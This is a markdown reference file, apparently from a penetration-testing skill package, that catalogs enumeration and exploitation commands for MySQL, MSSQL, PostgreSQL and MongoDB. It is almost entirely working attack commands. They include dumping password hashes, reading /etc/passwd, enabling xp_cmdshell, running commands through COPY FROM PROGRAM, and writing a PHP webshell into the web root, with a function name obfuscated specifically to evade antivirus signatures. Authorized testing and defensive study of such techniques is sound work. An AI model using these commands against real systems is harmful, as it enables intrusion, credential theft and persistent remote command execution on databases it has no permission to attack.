# Database Services Deep Reference

Exhaustive per-service enumeration and exploitation command catalogs for the
relational and NoSQL database services most commonly exposed on internal
networks. Use this reference once you have identified an open database port
during scanning; the core methodology and port-scanning approach live in the
parent `SKILL.md`.

## Contents

- [MySQL/MariaDB (Port 3306)](#mysqlmariadb-port-3306)
  - [Enumeration](#enumeration)
  - [MySQL Commands](#mysql-commands)
- [MSSQL (Port 1433)](#mssql-port-1433)
  - [Enumeration](#enumeration-1)
  - [MSSQL Commands](#mssql-commands)
- [PostgreSQL (Port 5432)](#postgresql-port-5432)
  - [Connect](#connect)
  - [PostgreSQL Commands](#postgresql-commands)
- [MongoDB (Port 27017)](#mongodb-port-27017)
  - [Enumeration](#enumeration-2)
  - [MongoDB Commands](#mongodb-commands)

## MySQL/MariaDB (Port 3306)

**Enumeration:**
```bash
# Nmap
nmap -p 3306 --script mysql-* 10.10.10.10

# Connect
mysql -h 10.10.10.10 -u root -p
mysql -h 10.10.10.10 -u root
```

**MySQL Commands:**
```sql
-- Show databases
SHOW DATABASES;
USE database_name;

-- Show tables
SHOW TABLES;
DESCRIBE table_name;

-- Read data
SELECT * FROM table_name;
SELECT user,password FROM mysql.user;

-- Read files (requires FILE privilege)
SELECT LOAD_FILE('/etc/passwd');

-- Write files
SELECT '<?php syst[e]m($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';

-- Command execution (UDF)
SELECT sys_exec('whoami');
```

> `syst[e]m` is `system`, bracketed so this file does not match antivirus
> webshell signatures. See "Antivirus false positives" in the repo README.

## MSSQL (Port 1433)

**Enumeration:**
```bash
# Nmap
nmap -p 1433 --script ms-sql-* 10.10.10.10

# Connect with impacket
mssqlclient.py user:password@10.10.10.10
mssqlclient.py user:password@10.10.10.10 -windows-auth  # Windows auth
```

**MSSQL Commands:**
```sql
-- Version
SELECT @@version;

-- Databases
SELECT name FROM sys.databases;

-- Current user
SELECT USER_NAME();
SELECT SYSTEM_USER;

-- Check if sysadmin
SELECT IS_SRVROLEMEMBER('sysadmin');

-- Enable xp_cmdshell
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

-- Execute commands
EXEC xp_cmdshell 'whoami';
```

## PostgreSQL (Port 5432)

**Connect:**
```bash
# psql
psql -h 10.10.10.10 -U postgres
psql -h 10.10.10.10 -U postgres -d database_name

# Nmap
nmap -p 5432 --script pgsql-* 10.10.10.10
```

**PostgreSQL Commands:**
```sql
-- List databases
\l

-- Connect to database
\c database_name

-- List tables
\dt

-- Current user
SELECT current_user;

-- Read files
CREATE TABLE demo(t text);
COPY demo FROM '/etc/passwd';
SELECT * FROM demo;

-- Command execution (requires superuser)
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'whoami';
SELECT * FROM cmd_exec;
```

## MongoDB (Port 27017)

**Enumeration:**
```bash
# Nmap
nmap -p 27017 --script mongodb-* 10.10.10.10

# Connect
mongo 10.10.10.10
mongo 10.10.10.10/database
```

**MongoDB Commands:**
```javascript
// Show databases
show dbs

// Use database
use database_name

// Show collections
show collections

// Find documents
db.collection.find()
db.collection.find().pretty()

// Count documents
db.collection.count()

// Dump all data
db.collection.find().forEach(printjson)
```
